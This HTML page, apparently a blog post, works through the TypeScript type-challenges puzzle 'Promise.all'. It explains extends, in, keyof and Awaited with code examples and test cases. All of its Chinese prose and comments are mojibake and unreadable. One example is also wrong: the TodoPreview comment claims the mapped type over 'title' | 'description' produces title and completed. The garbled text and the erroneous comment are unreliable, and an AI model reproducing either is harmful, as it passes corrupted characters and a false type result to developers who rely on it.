.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">20 - Promise.all</h2>
<p>by Anthony Fu (@antfu) #ä¸­ç­‰ #array #promise</p>
<h3 data-id="heading-1">é¢˜ç›®</h3>
<p>ç»™å‡½æ•°<code>PromiseAll</code>æŒ‡å®šç±»å‹ï¼Œå®ƒæ¥å—å…ƒç´ ä¸º Promise æˆ–è€…ç±»ä¼¼ Promise çš„å¯¹è±¡çš„æ•°ç»„ï¼Œè¿”å›å€¼åº”ä¸º<code>Promise&lt;T&gt;</code>ï¼Œå…¶ä¸­<code>T</code>æ˜¯è¿™äº› Promise çš„ç»“æœç»„æˆçš„æ•°ç»„ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> promise1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>);
<span class="hljs-keyword">const</span> promise2 = <span class="hljs-number">42</span>;
<span class="hljs-keyword">const</span> promise3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">100</span>, <span class="hljs-string">'foo'</span>);
});

<span class="hljs-comment">// åº”æ¨å¯¼å‡º `Promise&lt;[number, 42, string]&gt;`</span>
<span class="hljs-keyword">const</span> p = <span class="hljs-title class_">PromiseAll</span>([promise1, promise2, promise3] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>)
</code></pre>
<blockquote>
<p>åœ¨ Github ä¸ŠæŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F20%2Fzh-CN" target="_blank" title="https://tsch.js.org/20/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/20/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">ä»£ç </h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ ä½ çš„ä»£ç  _____________ */</span>

<span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title class_">PromiseAll</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">values</span>: [...T]): <span class="hljs-title class_">Promise</span>&lt;{ [K <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">Awaited</span>&lt;T[K]&gt; }&gt;

</code></pre>
<p>å…³é”®è§£é‡Šï¼š</p>
<ul>
<li><code>T extends any[]</code>ï¼šçº¦æŸ <code>T</code> å¿…é¡»æ˜¯æ•°ç»„ç±»å‹ã€‚</li>
<li><code>[...T]</code>ï¼šæ˜¯æ•°ç»„æ‰©å±•è¯­æ³•ï¼ˆå…ƒç»„å±•å¼€ï¼‰ï¼Œç”¨äºä¿ç•™è¾“å…¥æ•°ç»„çš„å…ƒç»„ç»“æ„ã€‚</li>
<li><code>Awaited&lt;T[K]&gt;</code>ï¼šè·å– <code>Promise</code> æˆ–è€…ç±»ä¼¼ <code>Promise</code> çš„å¯¹è±¡çš„ç»“æœç±»å‹ã€‚</li>
<li><code>Promise&lt;...&gt;</code>ï¼šå‡½æ•°è¿”å›ä¸€ä¸ª <code>Promise</code>ã€‚</li>
<li><code>{ [K in keyof T]: Awaited&lt;T[K]&gt; }</code>ï¼šå°†ç»“æœç±»å‹ç»„æˆæ•°ç»„ã€‚
<ul>
<li><code>{ [K in keyof T]: ... }</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ˜ å°„ç±»å‹ï¼Œéå†å…ƒç»„ <code>T</code> çš„æ‰€æœ‰ç´¢å¼• <code>K</code>ï¼ˆå¦‚ 0ã€1ã€2...ï¼‰ï¼Œå¹¶ä¸ºæ¯ä¸ªç´¢å¼•ç”Ÿæˆå¯¹åº”çš„ç±»å‹ã€‚</li>
<li><code>Awaited&lt;T[K]&gt;</code>ï¼šè·å– <code>Promise</code> æˆ–è€…ç±»ä¼¼ <code>Promise</code> çš„å¯¹è±¡çš„ç»“æœç±»å‹ã€‚
<ul>
<li>è‹¥ <code>T[K]</code> æ˜¯ <code>Promise&lt;X&gt;</code>ï¼Œåˆ™ <code>Awaited&lt;T[K]&gt;</code> ä¸º <code>X</code>;</li>
<li>è‹¥ <code>T[K]</code> æ˜¯æ™®é€šå€¼ <code>X</code>ï¼Œåˆ™ <code>Awaited&lt;T[K]&gt;</code> ä»ä¸º <code>X</code>;</li>
<li><code>Awaited</code> æ”¯æŒåµŒå¥— <code>Promise</code>ï¼Œå¦‚ <code>Awaited&lt;Promise&lt;Promise&lt;X&gt;&gt;&gt;</code> ä¹Ÿä¼šè§£æä¸º <code>X</code>ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">ç›¸å…³çŸ¥è¯†ç‚¹</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>ä½¿ç”¨ç»´åº¦</th><th>æ ¸å¿ƒä½œç”¨</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td>ç±»å‹ç»´åº¦</td><td>åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­ï¼ˆç±»å‹ç¼–ç¨‹æ ¸å¿ƒï¼‰</td><td>é™å®šæ³›å‹èŒƒå›´ã€åˆ¤æ–­ç±»å‹æ˜¯å¦å…¼å®¹ã€æå–ç±»å‹ç‰‡æ®µ</td></tr><tr><td>è¯­æ³•ç»´åº¦</td><td>åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</td><td>æ¥å£ç»§æ‰¿ã€ç±»ç»§æ‰¿</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­</h5>
<ol>
<li>æ³›å‹çº¦æŸï¼šé™å®šæ³›å‹çš„å–å€¼èŒƒå›´</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// çº¦æŸ T å¿…é¡»æ˜¯ã€Œæ‹¥æœ‰ length å±æ€§ã€çš„ç±»å‹ï¼ˆæ¯”å¦‚ string/æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨ï¼ˆç¬¦åˆçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// âœ… string æœ‰ lengthï¼Œè¿”å› 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// âœ… æ•°ç»„æœ‰ lengthï¼Œè¿”å› 3</span>

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ˆè¶…å‡ºçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šnumber æ²¡æœ‰ length å±æ€§</span>
</code></pre>
<ol start="2">
<li>æ¡ä»¶ç±»å‹ï¼šç±»å‹ç‰ˆ <strong>ä¸‰å…ƒè¿ç®—ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç¤ºä¾‹ï¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// trueï¼ˆç¬¦åˆï¼‰</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// falseï¼ˆä¸ç¬¦åˆï¼‰</span>
</code></pre>
<p>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼ˆè”åˆç±»å‹ä¸“ç”¨ï¼‰: å½“ <code>T</code> æ˜¯è”åˆç±»å‹æ—¶ï¼Œ<code>extends</code> ä¼šè‡ªåŠ¨æ‹†åˆ†è”åˆç±»å‹çš„æ¯ä¸ªæˆå‘˜ï¼Œé€ä¸ªåˆ¤æ–­åå†åˆå¹¶ç»“æœã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// æ‹†åˆ†é€»è¾‘ï¼šstringâ†’stringï¼Œnumberâ†’neverï¼Œbooleanâ†’never â†’ åˆå¹¶ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>æ³¨æ„ï¼šåªæœ‰æ³›å‹å‚æ•°æ˜¯ è£¸ç±»å‹ï¼ˆæ²¡æœ‰è¢« []/{} åŒ…è£¹ï¼‰æ—¶ï¼Œæ‰ä¼šè§¦å‘åˆ†å¸ƒå¼åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŒ…è£¹åä¸è§¦å‘åˆ†å¸ƒå¼ï¼Œæ•´ä½“åˆ¤æ–­ [string|number] æ˜¯å¦å…¼å®¹ [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// neverï¼ˆæ•´ä½“ä¸å…¼å®¹ï¼‰</span>
</code></pre>
<ol start="3">
<li>é…åˆ <code>infer</code>ï¼šæå–ç±»å‹ç‰‡æ®µï¼ˆé»„é‡‘ç»„åˆï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æå– Promise çš„è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// stringï¼ˆæå–æˆåŠŸï¼‰</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// numberï¼ˆä¸æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›åŸç±»å‹ï¼‰</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</h5>
<ol>
<li>æ¥å£ç»§æ‰¿ï¼šå¤ç”¨ + æ‰©å±•å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ç»§æ‰¿ Userï¼Œå¹¶æ‰©å±•æ–°å±æ€§</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// æ–°å¢æƒé™å±æ€§</span>
}

<span class="hljs-comment">// å¿…é¡»åŒ…å«ç»§æ‰¿çš„ + æ‰©å±•çš„æ‰€æœ‰å±æ€§</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// å¤šæ¥å£ç»§æ‰¿</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// åŒæ—¶ç»§æ‰¿ User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>ç±»ç»§æ‰¿ï¼šå¤ç”¨çˆ¶ç±»çš„å±æ€§ / æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// ç»§æ‰¿ Parent ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–çˆ¶ç±»å±æ€§ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»åŸæ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, æå›› â†’ I'm 10 years old</span>
</code></pre>
<p>è¡¥å……ï¼šç±»å®ç°æ¥å£ç”¨ <code>implements</code>ï¼ˆä¸æ˜¯ <code>extends</code>ï¼‰</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ¥å£ï¼ˆå¥‘çº¦ï¼šè§„å®šå¿…é¡»æœ‰ idã€name å±æ€§ï¼Œä»¥åŠ greet æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// ä»…å®šä¹‰æ–¹æ³•ç­¾åï¼Œæ— å®ç°</span>
}

<span class="hljs-comment">// ç±»å®ç°æ¥å£ï¼ˆå¿…é¡»ä¸¥æ ¼éµå®ˆå¥‘çº¦ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„æ‰€æœ‰å±æ€§</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–å±æ€§</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„ greet æ–¹æ³•ï¼ˆå…·ä½“å®ç°ç”±ç±»è‡ªå·±å®šä¹‰ï¼‰</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// å®ä¾‹åŒ–ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"å¼ ä¸‰"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, I'm å¼ ä¸‰, ID: 1</span>


<span class="hljs-comment">// æ¥å£1ï¼šåŸºç¡€ä¿¡æ¯</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ¥å£2ï¼šå¯æ‰“å°</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// ç±»åŒæ—¶å®ç°ä¸¤ä¸ªæ¥å£ï¼ˆå¿…é¡»å®ç°æ‰€æœ‰æ¥å£çš„æˆå‘˜ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ç±»å¯æ‰©å±•æ¥å£å¤–çš„å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å®ç° Identifiable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// å®ç° Printable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"æ‰‹æœº"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: æ‰‹æœº, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>in</code></h4>
<p><code>in</code> è¿ç®—ç¬¦ç”¨äºéå†è”åˆç±»å‹ä¸­çš„æ¯ä¸ªæˆå‘˜ï¼Œå°†å…¶è½¬æ¢ä¸ºæ˜ å°„ç±»å‹çš„å±æ€§åã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = <span class="hljs-string">'title'</span> | <span class="hljs-string">'description'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoPreview</span> = {
  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">TodoKeys</span>]: <span class="hljs-title class_">Todo</span>[P]
}
<span class="hljs-comment">// TodoPreview ç±»å‹ä¸ºï¼š</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   title: string</span>
<span class="hljs-comment">//   completed: boolean</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-8"><code>keyof</code></h4>
<p><code>keyof</code> è¿ç®—ç¬¦ç”¨äºè·å–ä¸€ä¸ªç±»å‹ï¼ˆæ¥å£ã€ç±»å‹åˆ«åã€å¯¹è±¡ç±»å‹ç­‰ï¼‰çš„æ‰€æœ‰å…¬å…±å±æ€§åï¼Œå¹¶è¿”å›è¿™äº›å±æ€§åç»„æˆçš„è”åˆç±»å‹ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = keyof <span class="hljs-title class_">Todo</span> <span class="hljs-comment">// "title" | "description" | "completed"</span>
</code></pre>
<h4 data-id="heading-9"><code>Awaited</code></h4>
<p><code>Awaited&lt;Type&gt;</code> ç”¨äºæå–åµŒå¥— <code>Promise</code> ç±»å‹çš„æœ€ç»ˆè§£æå€¼ã€‚</p>
<ol>
<li>å½“ <code>T</code> æ˜¯ <code>Promise&lt;U&gt;</code> æ—¶ï¼Œ<code>Awaited&lt;T&gt;</code> ä¼šè¿”å› <code>U</code>ã€‚</li>
<li>å¦‚æœ <code>U</code> æœ¬èº«ä¹Ÿæ˜¯ <code>Promise&lt;V&gt;</code>ï¼Œåˆ™ <code>Awaited&lt;T&gt;</code> ä¼šç»§ç»­é€’å½’ï¼Œè¿”å› <code>V</code>ã€‚</li>
<li>è‹¥ <code>T</code> ä¸æ˜¯ <code>Promise</code> ç±»å‹ï¼Œåˆ™ç›´æ¥è¿”å› <code>T</code>ã€‚</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> A = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// string</span>

<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;&gt;; <span class="hljs-comment">// number</span>

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-built_in">boolean</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;; <span class="hljs-comment">// number | boolean</span>
</code></pre>
<h3 data-id="heading-10">æµ‹è¯•ç”¨ä¾‹</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ æµ‹è¯•ç”¨ä¾‹ _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">const</span> promiseAllTest1 = <span class="hljs-title class_">PromiseAll</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>)
<span class="hljs-keyword">const</span> promiseAllTest2 = <span class="hljs-title class_">PromiseAll</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>)] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>)
<span class="hljs-keyword">const</span> promiseAllTest3 = <span class="hljs-title class_">PromiseAll</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>)])
<span class="hljs-keyword">const</span> promiseAllTest4 = <span class="hljs-title class_">PromiseAll</span>&lt;<span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
<span class="hljs-keyword">const</span> promiseAllTest5 = <span class="hljs-title class_">PromiseAll</span>&lt;(<span class="hljs-built_in">number</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;)[]&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'3'</span>)])

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest1, <span class="hljs-title class_">Promise</span>&lt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest2, <span class="hljs-title class_">Promise</span>&lt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-built_in">number</span>]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest3, <span class="hljs-title class_">Promise</span>&lt;[<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest4, <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>[]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest5, <span class="hljs-title class_">Promise</span>&lt;(<span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>)[]&gt;&gt;&gt;,
]

</code></pre>
<h3 data-id="heading-11">ç›¸å…³é“¾æ¥</h3>
<blockquote>
